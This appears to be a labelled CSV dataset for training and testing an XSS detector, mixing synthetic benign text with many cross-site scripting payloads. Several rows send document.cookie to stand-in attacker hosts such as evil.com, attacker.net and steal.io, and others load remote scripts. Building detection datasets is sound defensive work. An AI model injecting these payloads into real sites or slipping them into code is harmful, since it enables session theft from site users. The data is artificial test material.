+"Flat 6D, Mall Road, Mumbai 423331",0,address,benign,train
+Liam Taylor,0,name,benign,test
+"This was useful. Looking forward to more on football. Can you write a follow-up on music? Thanks. Great article about cricket, thanks for sharing! This was average. Looking forward to more on travel.",0,long_paragraph,benign_stress,stress
+<script>new Image().src='http://h4ck.me/?c='+document.cookie</script>,1,script_tag,script_tag,train
+Order #90847 confirmed.,0,order,benign,train
+Nice work John! The part about football helped me a lot.,0,comment,benign,val
+"""-alert(String.fromCharCode(88,83,83))-""",1,js_context,js_context,train
+"Support was solid, resolved my issue in 4 minutes.",0,feedback,benign,val
+Reply to sofia.patel43@mail.example by Friday.,0,email,benign,test
+SELECT name FROM users WHERE id = 805;,0,structured,benign_stress,stress
+"Great article about travel, thanks for sharing! Great article about photography, thanks for sharing! Can you write a follow-up on cricket? Thanks.",0,long_paragraph,benign_stress,stress
+"Monitor - great quality, ships in 6 days",0,product,benign,train
+Price range: $74 - $432,0,price_date,benign,test
+Order #96317 confirmed.,0,order,benign,val
+best laptop 2026,0,search,benign,train
+"Backpack - reliable quality, ships in 4 days",0,product,benign,train
+"House no. 167, Sector 55, Pune",0,address,benign,val
+I really liked this post on travel.,0,comment,benign,test
+Rating 3/5 - excellent experience overall.,0,feedback,benign,test
+"Great article about football, thanks for sharing!",0,comment,benign,train
+"Age: 66, Location: Delhi",0,price_date,benign,train
+Please contact john.verma95@company.com for help.,0,email,benign,val
+<body onload=confirm(1)><!-- 57570 -->,1,mixed_obfuscated,mixed_obfuscated,val
+best running shoes 2025,0,search,benign,train
+Meeting at 3am on 4 Oct,0,price_date,benign,train
+"Laptop - decent quality, ships in 6 days",0,product,benign,test
+Rating 1/5 - average experience overall.,0,feedback,benign,train
+f(x) = x^2 + 1x - 7; f(2) = ?,0,math,benign_stress,stress
+"<script type=""text/javascript"">alert('XSS')</script>",1,script_tag,script_tag,train
+"Flat 26D, MG Road, Austin 763121",0,address,benign,train
+"{'status': 'success', 'id': 998}",0,structured,benign_stress,stress
+kabir.garcia1@company.in,0,email,benign,train
+"Backpack - decent quality, ships in 4 days",0,product,benign,train
+Dr. Priya Garcia,0,name,benign,train
+"Age: 50, Location: Sydney",0,price_date,benign,train
+Reply to meera.verma86@mail.example by Friday.,0,email,benign,train
+<details open onload=alert(origin)>,1,event_common,event_common,val
+Your order of 4 x headphones was shipped on 21/11/2026.,0,order,benign,train
+"Support was solid, resolved my issue in 13 minutes.",0,feedback,benign,test
+"&#x3C;img src=x onerror=alert(String.fromCharCode(88,83,83))&#x3E;",1,encoded,encoded,train
+Your order of 5 x water bottle was shipped on 23/8/2026.,0,order,benign,train
+"<iframe src=""data:text/html,<b>94695</b>""></iframe>",1,data_uri,data_uri,stress
+This was decent. Looking forward to more on cricket.,0,comment,benign,train
+David Patel-Brown,0,name,benign,val
+"<form action=""javascript:prompt(1)""><input type=submit>",1,js_uri,js_uri,val
+"<details open onfocus=""alert(document.cookie)"">",1,event_common,event_common,val
+<svg><animate onbegin=alert(origin) attributeName=x dur=1s>,1,mutation_xss,mutation_xss,stress
+Meeting at 12pm on 10 Mar,0,price_date,benign,train
+"Age: 63, Location: Mumbai",0,price_date,benign,train
+"<math><mtext><table><mglyph><style><!--</style><img title=""--&gt;&lt;img src=1 onerror=alert('XSS')&gt;"">",1,mutation_xss,mutation_xss,stress
+Dr. Priya Verma,0,name,benign,train
+"""Sneha said: 'it's solid!'""",0,structured,benign_stress,stress
+<i>Neha</i> said the keyboard is decent.,0,html_formatting,benign_stress,stress
+"<noscript><p title=""</noscript><img src=x onerror=alert(String.fromCharCode(88,83,83))>"">",1,mutation_xss,mutation_xss,stress
+'-alert(document.domain)-',1,js_context,js_context,train
+Order #69759 confirmed.,0,order,benign,val
+Liam Ali-Garcia,0,name,benign,test
+"House no. 90, Sector 25, Pune",0,address,benign,train
+Product ID: 548324,0,product,benign,train
+<scr<script>ipt>alert(1)</scr</script>ipt>,1,mixed_obfuscated,mixed_obfuscated,train
+"<img src=x onerror=""new Image().src='http://attacker.net/?c='+document.cookie"">",1,exfil_dom,exfil_dom,train
+"<meta http-equiv=""refresh"" content=""0;url=data:text/html,<script>alert(1)</script>"">",1,mutation_xss,mutation_xss,stress
+""";alert(document.domain)//",1,js_context,js_context,test
+Product ID: 283514,0,product,benign,train
+x=document.cookie;alert('XSS');//22782,1,js_context_long,js_context_long,stress
+Solve: 4x + 19 = 97,0,math,benign_stress,stress
+"Notebook - reliable quality, ships in 1 days",0,product,benign,val
+Kabir_Reddy54,0,name,benign,train
+"<img src=x ontoggle=""alert(String.fromCharCode(88,83,83))"">",1,event_common,event_common,train
+<script src=http://c2.example.org/x.js></script>,1,script_tag,script_tag,val
+Can you write a follow-up on cricket? Thanks.,0,comment,benign,train
+7 < 18 && 36 > 4,0,math,benign_stress,stress
+"';var a=new XMLHttpRequest();a.open('GET','http://steal.io/'+document.domain);//",1,js_context_long,js_context_long,stress
+Product ID: 861265,0,product,benign,train
+Refund of $96.58 processed for order 89244.,0,order,benign,test
+\';prompt(1)//,1,js_context,js_context,train
+<i>Kabir</i> said the monitor is decent.,0,html_formatting,benign_stress,stress
+"<a href=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">x</a>",1,data_uri,data_uri,stress
+Price range: $172 - $290,0,price_date,benign,test
+"JaVaScRiPt:alert(String.fromCharCode(88,83,83))",1,case_whitespace,case_whitespace,stress
+"House no. 203, Sector 33, Delhi",0,address,benign,train
+zara.clark25@company.in,0,email,benign,test
+';alert(origin)//,1,js_context,js_context,test
+"House no. 472, Sector 6, Mumbai",0,address,benign,train
+Nice work Liam! The part about football helped me a lot.,0,comment,benign,val
+<body onload=alert(document.cookie)><!-- 13945 -->,1,mixed_obfuscated,mixed_obfuscated,val
+keyboard review,0,search,benign,train
+<svg><animate onbegin=console.log(1) attributeName=x dur=1s>,1,mutation_xss,mutation_xss,stress
+&#x3C;img src=x onerror=alert('XSS')&#x3E;,1,encoded,encoded,train
+"Flat 12D, Station Road, Delhi 873207",0,address,benign,train
+Can you write a follow-up on gardening? Thanks.,0,comment,benign,train
+Rating 4/5 - amazing experience overall.,0,feedback,benign,val
+My function onLoad handler is slow when loading 207 rows.,0,code_talk,benign_stress,stress
+%3cscript%3ealert(document.cookie)%3c%2fscript%3e,1,encoded,encoded,train
+Category: Sports & Garden,0,product,benign,train
+"<body onload=""fetch('http://bad.site/?c='+document.cookie)"">",1,exfil_dom,exfil_dom,train
+"<meta http-equiv=""refresh"" content=""0;url=data:text/html,<script>alert(document.domain)</script>"">",1,mutation_xss,mutation_xss,stress
+Rating 4/5 - solid experience overall.,0,feedback,benign,train
+<span onauxclick=alert(1)>click,1,rare_handler,rare_handler,stress
+Order #39697 confirmed.,0,order,benign,train
+"<body onload=""fetch('http://evil.com/?c='+document.cookie)"">",1,exfil_dom,exfil_dom,train
+<script>fetch('http://c2.example.org/?c='+document.cookie)</script>,1,script_tag,script_tag,train
+"This was great. Looking forward to more on music. This was excellent. Looking forward to more on databases. Great article about travel, thanks for sharing! I honestly liked this post on travel.",0,long_paragraph,benign_stress,stress
+%3Cscript%3Econfirm(1)%3C/script%3E,1,encoded,encoded,train
+');prompt(1)</script>,1,js_context,js_context,train
+<video src=x onfocus=console.log(1)>,1,event_common,event_common,train
+<body onload=alert(origin)><!-- 95976 -->,1,mixed_obfuscated,mixed_obfuscated,train
+amit.lopez85@gmail.com,0,email,benign,train
+Rahul_Patel56,0,name,benign,train
+Price range: $141 - $360,0,price_date,benign,val
+<script src=http://bad.site/x.js></script>,1,script_tag,script_tag,test
+Please contact noah.kumar61@company.com for help.,0,email,benign,train
+"<a href=""javascript:document.location='http://evil.com/?c='+document.cookie"">Claim Prize</a>",1,exfil_dom,exfil_dom,train
+sneha.wilson42@outlook.com,0,email,benign,train
+Price range: $53 - $657,0,price_date,benign,train
+Noah Clark,0,name,benign,train
+<textarea onpointerdown=confirm(1)>hover,1,rare_handler,rare_handler,stress
+"Coffee Maker - useful quality, ships in 2 days",0,product,benign,val
+SELECT name FROM users WHERE id = 150;,0,structured,benign_stress,stress
+<svg/ontoggle=alert(document.cookie)>,1,event_common,event_common,train
+"<img src=x onerror=""document.location='http://steal.io/?c='+document.cookie"">",1,exfil_dom,exfil_dom,train
+Can you write a follow-up on cooking? Thanks.,0,comment,benign,train
+';alert('XSS')//,1,js_context,js_context,train
+""";prompt(1)//",1,js_context,js_context,val
+Order #61684 confirmed.,0,order,benign,train
+<svg><script>alert(origin)</script></svg>,1,mixed_obfuscated,mixed_obfuscated,val
+"Great article about music, thanks for sharing! Great article about football, thanks for sharing! Nice work Chen! The part about football helped me a lot.",0,long_paragraph,benign_stress,stress
+Can you write a follow-up on machine learning? Thanks.,0,comment,benign,val
+Chen Joshi-Ali,0,name,benign,val
+best running shoes 2021,0,search,benign,val
+"<noscript><p title=""</noscript><img src=x onerror=confirm(1)>"">",1,mutation_xss,mutation_xss,stress
+Emma Garcia,0,name,benign,test
+<ScRiPt>alert(origin)</sCrIpT>,1,case_whitespace,case_whitespace,stress
+"""Neha said: 'it's solid!'""",0,structured,benign_stress,stress
+<scr<script>ipt>alert('XSS')</scr</script>ipt>,1,mixed_obfuscated,mixed_obfuscated,train
+"Great article about travel, thanks for sharing!",0,comment,benign,train
+<i>Rahul</i> said the phone case is reliable.,0,html_formatting,benign_stress,stress
+"<body onload=alert(String.fromCharCode(88,83,83))><!-- 43262 -->",1,mixed_obfuscated,mixed_obfuscated,train
+8 < 16 && 40 > 7,0,math,benign_stress,stress
+Product ID: 489439,0,product,benign,test
+"House no. 62, Sector 56, Berlin",0,address,benign,test
+javascript:alert(document.domain),1,js_uri,js_uri,train
+Price range: $111 - $516,0,price_date,benign,test
+"<body onload=""document.location='http://attacker.net/?c='+document.cookie"">",1,exfil_dom,exfil_dom,train
+Price range: $119 - $679,0,price_date,benign,train
+JaVaScRiPt:console.log(1),1,case_whitespace,case_whitespace,stress
+Your order of 3 x coffee maker was shipped on 16/1/2026.,0,order,benign,val
+headphones deals,0,search,benign,train
+"<img src=x onerror=""fetch('http://bad.site/?c='+document.cookie)"">",1,exfil_dom,exfil_dom,train
+"House no. 204, Sector 33, Pune",0,address,benign,train
+"<iframe src=""javascript:alert(document.domain)""></iframe>",1,js_uri,js_uri,val
+');alert(document.cookie)</script>,1,js_context,js_context,test
+Maria_Brown91,0,name,benign,train
+"Laptop - solid quality, ships in 3 days",0,product,benign,val
+Refund of $60.14 processed for order 96479.,0,order,benign,val
+</script><svg/onload=alert(origin)>,1,js_context_long,js_context_long,stress
+JaVaScRiPt:alert(origin),1,case_whitespace,case_whitespace,stress
+Order #77552 confirmed.,0,order,benign,train
+"Age: 47, Location: Ghaziabad",0,price_date,benign,train
+"Water Bottle - useful quality, ships in 4 days",0,product,benign,val
+<body onload=console.log(1)><!-- 55429 -->,1,mixed_obfuscated,mixed_obfuscated,train
+<script>alert(1)</script>,1,script_tag,script_tag,train
+Dr. John Khan,0,name,benign,train
+"<iframe src=""data:text/html,<b>18168</b>""></iframe>",1,data_uri,data_uri,stress
+best laptop 2025,0,search,benign,train
+Meeting at 5pm on 20 Jan,0,price_date,benign,train
+x=document.cookie;prompt(1);//40943,1,js_context_long,js_context_long,stress
+Refund of $54.19 processed for order 96649.,0,order,benign,test
+<iframe src=http://steal.io/p.html></iframe>,1,frame_object,frame_object,train
+Product ID: 331444,0,product,benign,test
+"<iframe src=""javascript:alert('XSS')""></iframe>",1,js_uri,js_uri,test
+Arjun Taylor-Mehta,0,name,benign,val
+"Nice work Noah! The part about machine learning helped me a lot. Great article about music, thanks for sharing! I quite liked this post on cooking. Great article about travel, thanks for sharing!",0,long_paragraph,benign_stress,stress
+<script>document.location='http://x.example/?c='+document.cookie</script>,1,script_tag,script_tag,val
+Your order of 3 x keyboard was shipped on 6/4/2026.,0,order,benign,val
+Dr. Maria Lopez,0,name,benign,train
+"Support was decent, resolved my issue in 4 minutes.",0,feedback,benign,train
+"<body onload=""document.location='http://evil.com/?c='+document.cookie"">",1,exfil_dom,exfil_dom,train
+Price range: $196 - $715,0,price_date,benign,train
+Arjun Khan-Rao,0,name,benign,val
+Price range: $139 - $825,0,price_date,benign,train
+"Flat 38A, Station Road, Ghaziabad 348273",0,address,benign,train
+"918 Mall Road, Pune",0,address,benign,val
+<body onload=alert(origin)><!-- 85830 -->,1,mixed_obfuscated,mixed_obfuscated,train
+how to learn gardening fast,0,search,benign,test
+Emma Khan-Taylor,0,name,benign,train
+"<script>alert(String.fromCharCode(88,83,83))</script>",1,script_tag,script_tag,train
+Chen_Gupta31,0,name,benign,train
+');prompt(1);//,1,js_context,js_context,test
+meera.garcia5@college.edu,0,email,benign,val
+"House no. 487, Sector 32, London",0,address,benign,val
+'-prompt(1)-',1,js_context,js_context,test
+JaVaScRiPt:alert(document.cookie),1,case_whitespace,case_whitespace,stress
+<ScRiPt>prompt(1)</sCrIpT>,1,case_whitespace,case_whitespace,stress
+This was decent. Looking forward to more on machine learning. This was solid. Looking forward to more on travel. Can you write a follow-up on databases? Thanks.,0,long_paragraph,benign_stress,stress
+"""-alert(document.domain)-""",1,js_context,js_context,train
+best office chair 2026,0,search,benign,train
+<body onload=confirm(1)><!-- 97145 -->,1,mixed_obfuscated,mixed_obfuscated,train
+Please contact chen.lopez53@company.com for help.,0,email,benign,train
+Amit Singh,0,name,benign,train
+Refund of $27.18 processed for order 49537.,0,order,benign,train
+Can you write a follow-up on networking? Thanks.,0,comment,benign,train
+Noah_Sharma46,0,name,benign,train
+"Support was decent, resolved my issue in 3 minutes.",0,feedback,benign,train
+"<iframe src=""data:text/html,<b>55203</b>""></iframe>",1,data_uri,data_uri,stress
+Meeting at 7am on 11 Jan,0,price_date,benign,test
+"<svg><script>alert(String.fromCharCode(88,83,83))</script></svg>",1,mixed_obfuscated,mixed_obfuscated,train
+%3Cscript%3Ealert(document.domain)%3C/script%3E,1,encoded,encoded,val
+&#60;script&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#83;&#116;,1,encoded,encoded,val
+"<a href=""javascript:new Image().src='http://h4ck.me/?c='+document.cookie"">Claim Prize</a>",1,exfil_dom,exfil_dom,train
+<input autofocus onload=alert(document.cookie)>,1,event_common,event_common,train
+"<body onload=alert(String.fromCharCode(88,83,83))><!-- 65844 -->",1,mixed_obfuscated,mixed_obfuscated,test
+"Notebook - disappointing quality, ships in 7 days",0,product,benign,test
+"<img src=x onerror=""document.location='http://h4ck.me/?c='+document.cookie"">",1,exfil_dom,exfil_dom,train
+SELECT name FROM users WHERE id = 175;,0,structured,benign_stress,stress
+"<svg/onload=alert(String.fromCharCode(88,83,83))>",1,event_common,event_common,val
+<textarea onanimationstart=alert(document.domain)>hover,1,rare_handler,rare_handler,stress
+"%3Cscript%3Ealert(String.fromCharCode(88,83,83))%3C/script%3E",1,encoded,encoded,train
+Feedback: Amazing service and quick delivery.,0,feedback,benign,test
+<span oncopy=prompt(1)>x,1,rare_handler,rare_handler,stress
+<svg/ontoggle=confirm(1)>,1,event_common,event_common,train
+<body onload=alert('XSS')><!-- 12358 -->,1,mixed_obfuscated,mixed_obfuscated,val
+"House no. 203, Sector 58, Delhi",0,address,benign,test
+Refund of $68.69 processed for order 24459.,0,order,benign,test
+"');alert(String.fromCharCode(88,83,83))</script>",1,js_context,js_context,val
+\';confirm(1)//,1,js_context,js_context,train
+"Support was solid, resolved my issue in 21 minutes.",0,feedback,benign,train
+&#60;script&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#100;&#111;,1,encoded,encoded,test
+"<svg onload=""alert(1)"">",1,event_common,event_common,train
+Meeting at 2pm on 22 Oct,0,price_date,benign,test
+Your order of 5 x running shoes was shipped on 19/7/2026.,0,order,benign,train
+Refund of $159.44 processed for order 99842.,0,order,benign,train
+"<video src=x onmouseover=alert(String.fromCharCode(88,83,83))>",1,event_common,event_common,train
+%3cscript%3econfirm(1)%3c%2fscript%3e,1,encoded,encoded,train
+%3cscript%3ealert(document.domain)%3c%2fscript%3e,1,encoded,encoded,train
+"<body onstart=""confirm(1)"">",1,event_common,event_common,test
+"<noscript><p title=""</noscript><img src=x onerror=console.log(1)>"">",1,mutation_xss,mutation_xss,stress
+<details open onmouseover=alert(origin)>,1,event_common,event_common,train
+"<img src=x onerror=""eval(atob('YWxlcnQoMSk='))"">",1,exfil_dom,exfil_dom,test
+<iframe src=http://c2.example.org/p.html></iframe>,1,frame_object,frame_object,train
+"<a href=""javascript:document.location='http://c2.example.org/?c='+document.cookie"">Claim Prize</a>",1,exfil_dom,exfil_dom,train
+"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",1,frame_object,frame_object,train
+"<iframe src=""data:text/html,<b>66135</b>""></iframe>",1,data_uri,data_uri,stress
+<svg><animate onbegin=prompt(1) attributeName=x dur=1s>,1,mutation_xss,mutation_xss,stress
+<span onpageshow=alert(document.domain)>hover,1,rare_handler,rare_handler,stress
+Please contact chen.joshi49@company.com for help.,0,email,benign,train
+Refund of $103.46 processed for order 32514.,0,order,benign,val
+"<b>Decent</b> post, thanks Anita!",0,html_formatting,benign_stress,stress
+<span onmouseenter=alert(1)>hover,1,rare_handler,rare_handler,stress
+Order #60956 confirmed.,0,order,benign,train
+"Support was excellent, resolved my issue in 6 minutes.",0,feedback,benign,test
+Order #39855 confirmed.,0,order,benign,train
+page=2&sort=desc&q=desk+lamp,0,url_path,benign_stress,stress
+"<video src=x onload=""alert('XSS')"">",1,event_common,event_common,val
+<script src=http://attacker.net/x.js></script>,1,script_tag,script_tag,val
+SKU-7987-DX,0,product,benign,train
+f(x) = x^2 + 4x - 4; f(4) = ?,0,math,benign_stress,stress
+SKU-2449-BY,0,product,benign,val
+<script>alert('XSS')</script>,1,script_tag,script_tag,val
+"Support was disappointing, resolved my issue in 24 minutes.",0,feedback,benign,test
+<a href=# onbegin=confirm(1)>x,1,rare_handler,rare_handler,stress
+"';alert(String.fromCharCode(88,83,83))//",1,js_context,js_context,train
+Category: Electronics & Hardware,0,product,benign,val
+Nice work David! The part about networking helped me a lot.,0,comment,benign,train
+I used the script tag in my page and the football demo worked.,0,code_talk,benign_stress,stress
+Your order of 5 x water bottle was shipped on 11/4/2026.,0,order,benign,train
+<svg/onstart=alert(origin)>,1,event_common,event_common,test
+"Support was great, resolved my issue in 21 minutes.",0,feedback,benign,train
+maria.kumar78@gmail.com,0,email,benign,train
+<svg><script>confirm(1)</script></svg>,1,mixed_obfuscated,mixed_obfuscated,test
+""";alert(origin)//",1,js_context,js_context,test
+Meeting at 6am on 23 Mar,0,price_date,benign,train
+<scr<script>ipt>console.log(1)</scr</script>ipt>,1,mixed_obfuscated,mixed_obfuscated,val
+I used the script tag in my page and the python demo worked.,0,code_talk,benign_stress,stress
+Sofia Joshi-Brown,0,name,benign,val
+headphones price,0,search,benign,train
+amit.patel19@outlook.com,0,email,benign,train
+kabir.wang32@company.in,0,email,benign,train
+solid running shoes under 193 dollars,0,search,benign,val
+Rating 3/5 - average experience overall.,0,feedback,benign,train
+<select onmouseenter=alert('XSS')>click,1,rare_handler,rare_handler,stress
+"<body onfocus=""confirm(1)"">",1,event_common,event_common,train
+My function onLoad handler is slow when loading 124 rows.,0,code_talk,benign_stress,stress
+Your order of 1 x headphones was shipped on 20/4/2026.,0,order,benign,val
+<ScRiPt>confirm(1)</sCrIpT>,1,case_whitespace,case_whitespace,stress
+Refund of $178.98 processed for order 24721.,0,order,benign,test
+"Age: 23, Location: Pune",0,price_date,benign,val
+<svg><script>console.log(1)</script></svg>,1,mixed_obfuscated,mixed_obfuscated,train
+Rating 1/5 - amazing experience overall.,0,feedback,benign,train
+Rating 2/5 - amazing experience overall.,0,feedback,benign,train
+I quite liked this post on networking.,0,comment,benign,test
+Reply to sofia.lopez35@mail.example by Friday.,0,email,benign,train
+<body onload=alert(document.domain)><!-- 4403 -->,1,mixed_obfuscated,mixed_obfuscated,train
+best water bottle 2021,0,search,benign,train
+Product ID: 146038,0,product,benign,train
+if x < 2 and y > 4 then z = x + y,0,math,benign_stress,stress
+9 < 11 && 37 > 8,0,math,benign_stress,stress
+"Age: 31, Location: Noida",0,price_date,benign,train
+Please contact noah.brown79@company.com for help.,0,email,benign,train
+Amit Taylor,0,name,benign,train
+Emma Joshi-Brown,0,name,benign,train
+7 < 11 && 34 > 8,0,math,benign_stress,stress
+This was useful. Looking forward to more on football.,0,comment,benign,train
+"<p>Hi team, the water bottle arrived.</p>",0,html_formatting,benign_stress,stress
+"House no. 361, Sector 52, Mumbai",0,address,benign,train
+<script>document.write('<img src=http://attacker.net/?c='+document.cookie+'>')</script>,1,exfil_dom,exfil_dom,train
+average desk lamp under 239 dollars,0,search,benign,train
+"Flat 25D, MG Road, London 325146",0,address,benign,train
+amazing backpack under 12 dollars,0,search,benign,val
+best office chair 2022,0,search,benign,train
+Your order of 3 x office chair was shipped on 2/9/2026.,0,order,benign,train
+"<img src=x onerror=""document.location='http://attacker.net/?c='+document.cookie"">",1,exfil_dom,exfil_dom,test
+This was reliable. Looking forward to more on networking. Nice work Fatima! The part about travel helped me a lot. I honestly liked this post on photography.,0,long_paragraph,benign_stress,stress
+page=6&sort=desc&q=water+bottle,0,url_path,benign_stress,stress
+');alert(1)</script>,1,js_context,js_context,train
+Refund of $199.64 processed for order 38085.,0,order,benign,train
+This was great. Looking forward to more on music. Nice work Sneha! The part about web security helped me a lot. Nice work David! The part about python helped me a lot.,0,long_paragraph,benign_stress,stress
+"<embed src=""http://attacker.net/x.svg"">",1,frame_object,frame_object,val
+Product ID: 436467,0,product,benign,train
+Can you write a follow-up on web security? Thanks.,0,comment,benign,train
+This was excellent. Looking forward to more on networking.,0,comment,benign,val
+<script>document.location='http://c2.example.org/?c='+document.cookie</script>,1,script_tag,script_tag,val
+if x < 5 and y > 9 then z = x + y,0,math,benign_stress,stress
+SKU-6221-DY,0,product,benign,test
+great keyboard under 248 dollars,0,search,benign,val
+Dr. Chen Clark,0,name,benign,train
+"Support was great, resolved my issue in 29 minutes.",0,feedback,benign,train
+Priya_Patel56,0,name,benign,train
+Please contact john.gupta84@company.com for help.,0,email,benign,test
+if x < 4 and y > 9 then z = x + y,0,math,benign_stress,stress
+kabir.brown2@college.edu,0,email,benign,train
+phone case price,0,search,benign,train
+Rating 3/5 - useful experience overall.,0,feedback,benign,train
+"House no. 378, Sector 45, London",0,address,benign,test
+"<b>Amazing</b> post, thanks Sneha!",0,html_formatting,benign_stress,stress
+<svg/onmouseover=alert(document.cookie)>,1,event_common,event_common,train
+'-alert(document.cookie)-',1,js_context,js_context,test
+SKU-1646-DZ,0,product,benign,val
+"""onmouseover=""alert(String.fromCharCode(88,83,83))"" x=""",1,js_context_long,js_context_long,stress
+Please contact arjun.joshi83@company.com for help.,0,email,benign,train
+"House no. 396, Sector 7, Austin",0,address,benign,test
+"<b>Reliable</b> post, thanks Fatima!",0,html_formatting,benign_stress,stress
+Noah Joshi-Wang,0,name,benign,test
+Noah_Joshi25,0,name,benign,train
+<scr<script>ipt>alert(document.domain)</scr</script>ipt>,1,mixed_obfuscated,mixed_obfuscated,test
+"Support was solid, resolved my issue in 5 minutes.",0,feedback,benign,train
+reliable backpack under 466 dollars,0,search,benign,train
+"Support was reliable, resolved my issue in 4 minutes.",0,feedback,benign,test
+"<img src=x onerror=""fetch('http://x.example/?c='+document.cookie)"">",1,exfil_dom,exfil_dom,test
+"{'status': 'success', 'id': 106}",0,structured,benign_stress,stress
+Refund of $73.22 processed for order 92863.,0,order,benign,test
+%3cscript%3ealert('XSS')%3c%2fscript%3e,1,encoded,encoded,train
+I used the script tag in my page and the databases demo worked.,0,code_talk,benign_stress,stress
+Why does fetch return a promise? Asking about web security code.,0,code_talk,benign_stress,stress
+&#x3C;img src=x onerror=prompt(1)&#x3E;,1,encoded,encoded,train
+<svg><script>alert(document.domain)</script></svg>,1,mixed_obfuscated,mixed_obfuscated,test
+/var/www/networking/index.html,0,url_path,benign_stress,stress
+Dr. David Khan,0,name,benign,train
+This was disappointing. Looking forward to more on databases.,0,comment,benign,test
+Please contact fatima.mehta72@company.com for help.,0,email,benign,test
+SKU-9666-AY,0,product,benign,train
+'-confirm(1)-',1,js_context,js_context,val
+"1;alert(String.fromCharCode(88,83,83))",1,js_context,js_context,test
+"""onmouseover=""alert(1)"" x=""",1,js_context_long,js_context_long,stress
+&#x3C;img src=x onerror=console.log(1)&#x3E;,1,encoded,encoded,val
+I honestly liked this post on cricket.,0,comment,benign,val
+"<iframe srcdoc=""<script>alert(String.fromCharCode(88,83,83))</script>""></iframe>",1,frame_object,frame_object,val
+Price range: $188 - $628,0,price_date,benign,train
+Refund of $91.99 processed for order 58487.,0,order,benign,val
+"<iframe srcdoc=""<script>confirm(1)</script>""></iframe>",1,frame_object,frame_object,train
+emma.wang26@outlook.com,0,email,benign,train
+"House no. 416, Sector 48, Austin",0,address,benign,train
+Can you write a follow-up on travel? Thanks.,0,comment,benign,train
+"270 Station Road, Toronto",0,address,benign,val
+Your order of 4 x water bottle was shipped on 28/4/2026.,0,order,benign,train
+how to learn web security fast,0,search,benign,train
+<img src=x onerror=alert(origin)>,1,event_common,event_common,val
+Noah Verma,0,name,benign,test
+Reply to john.joshi54@mail.example by Friday.,0,email,benign,train
+I quite liked this post on photography.,0,comment,benign,test
+Order #10567 confirmed.,0,order,benign,test
+<script>document.write('<img src=http://x.example/?c='+document.cookie+'>')</script>,1,exfil_dom,exfil_dom,train
+I honestly liked this post on python. Can you write a follow-up on python? Thanks. Can you write a follow-up on gardening? Thanks. This was amazing. Looking forward to more on football. Nice work Sneha! The part about music helped me a lot.,0,long_paragraph,benign_stress,stress
+"<a href=""javascript:new Image().src='http://steal.io/?c='+document.cookie"">Claim Prize</a>",1,exfil_dom,exfil_dom,val
+Please contact david.clark81@company.com for help.,0,email,benign,val
+"<svg ontoggle=""alert(origin)"">",1,event_common,event_common,val
+<body onload=confirm(1)><!-- 56886 -->,1,mixed_obfuscated,mixed_obfuscated,test
+Refund of $210.51 processed for order 25833.,0,order,benign,train
+<svg><animate onbegin=alert(document.cookie) attributeName=x dur=1s>,1,mutation_xss,mutation_xss,stress
+Feedback: Decent service and quick delivery.,0,feedback,benign,train
+Price range: $195 - $855,0,price_date,benign,train
+Meera Taylor,0,name,benign,train
+Meeting at 2pm on 16 Oct,0,price_date,benign,val
+"Support was amazing, resolved my issue in 24 minutes.",0,feedback,benign,test
+"<img src=x onerror=""new Image().src='http://c2.example.org/?c='+document.cookie"">",1,exfil_dom,exfil_dom,train
+<IMG SRC=x ONERROR=ALERT(ORIGIN)>,1,case_whitespace,case_whitespace,stress
+Product ID: 739008,0,product,benign,test
+C:\Users\Sneha\Documents\laptop.txt,0,url_path,benign_stress,stress
+Category: Sports & Hardware,0,product,benign,train
+<svg><script>alert(document.cookie)</script></svg>,1,mixed_obfuscated,mixed_obfuscated,train
+Reply to liam.garcia33@mail.example by Friday.,0,email,benign,val
+Rating 5/5 - disappointing experience overall.,0,feedback,benign,val
+"717 Mall Road, Noida",0,address,benign,val
+I really liked this post on databases.,0,comment,benign,train
+"<form action=""javascript:confirm(1)""><input type=submit>",1,js_uri,js_uri,val
+Category: Books & Hardware,0,product,benign,train
+<script src=http://h4ck.me/x.js></script>,1,script_tag,script_tag,train
+"652 Mall Road, Delhi",0,address,benign,train
+"Age: 34, Location: Delhi",0,price_date,benign,train
+<SCRIPT>alert('XSS')</SCRIPT>,1,script_tag,script_tag,test
+best keyboard 2020,0,search,benign,train
+noah.sharma27@outlook.com,0,email,benign,train
+"""-console.log(1)-""",1,js_context,js_context,train
+"<body onload=""new Image().src='http://bad.site/?c='+document.cookie"">",1,exfil_dom,exfil_dom,train
+average backpack under 382 dollars,0,search,benign,test
+"Support was great, resolved my issue in 9 minutes.",0,feedback,benign,train
+"<iframe src=""javascript:confirm(1)""></iframe>",1,js_uri,js_uri,val
+"<img
+src=x
+OnErRoR=console.log(1)>",1,case_whitespace,case_whitespace,stress
+Dr. John Verma,0,name,benign,train
+"<IMG SRC=x ONERROR=ALERT(STRING.FROMCHARCODE(88,83,83))>",1,case_whitespace,case_whitespace,stress
+chen.singh3@college.edu,0,email,benign,test
+"{'status': 'success', 'id': 6722}",0,structured,benign_stress,stress
+%3Cscript%3Econsole.log(1)%3C/script%3E,1,encoded,encoded,test
+Nice work Omar! The part about photography helped me a lot.,0,comment,benign,val
+"');alert(String.fromCharCode(88,83,83));//",1,js_context,js_context,train
+how to learn networking fast,0,search,benign,train
+"<body ontoggle=""confirm(1)"">",1,event_common,event_common,val
+Category: Home & Outdoors,0,product,benign,train
+Dr. Zara Garcia,0,name,benign,test
+"<body onload=alert(String.fromCharCode(88,83,83))><!-- 12813 -->",1,mixed_obfuscated,mixed_obfuscated,train
+"Tip: avoid eval in your code, use JSON.parse for football data.",0,code_talk,benign_stress,stress
+"<iframe src=""data:text/html,<b>96987</b>""></iframe>",1,data_uri,data_uri,stress
+https://www.example.com/gardening?page=17&sort=asc,0,url_path,benign_stress,stress
+"{'status': 'success', 'id': 1101}",0,structured,benign_stress,stress
+"<input autofocus onmouseover=""alert(String.fromCharCode(88,83,83))"">",1,event_common,event_common,train
+Please contact john.brown86@company.com for help.,0,email,benign,train
+';prompt(1)//,1,js_context,js_context,train
+"{'status': 'success', 'id': 98}",0,structured,benign_stress,stress
